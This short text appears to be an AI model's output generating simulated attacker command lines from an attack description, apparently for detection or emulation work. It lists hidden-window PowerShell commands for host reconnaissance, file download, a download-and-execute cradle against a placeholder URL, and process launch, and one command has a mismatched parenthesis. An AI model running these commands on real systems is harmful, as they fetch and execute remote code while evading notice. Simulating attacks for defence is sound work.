Based on the provided documentation and attack description, I will generate realistic command lines to simulate the behavior.

Here are the command lines:

Command: `powershell.exe -nop -w hidden -c "whoami; ipconfig; systeminfo"`

This command uses PowerShell to execute three commands: `whoami` (displays the username of the current user), `ipconfig` (displays network configuration information), and `systeminfo` (displays system information).

Command: `powershell.exe -nop -w hidden -c "New-Object System.Net.WebClient).DownloadFile('http://<url>/<file>', '<local_file>')"`

This command uses PowerShell to download a file from a URL using the `WebClient` class.

Command: `powershell.exe -nop -w hidden -c "Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://<url>/<script>'))"`

This command uses PowerShell to download and execute a script from a URL using the `DownloadString` method.

Command: `powershell.exe -nop -w hidden -c "Start-Process -FilePath '<file_path>' -ArgumentList '<arguments>'"`

This command uses PowerShell to start a process with specified file path and arguments.

Note that I have used placeholders for URLs, file paths, and registry keys as per the instructions.
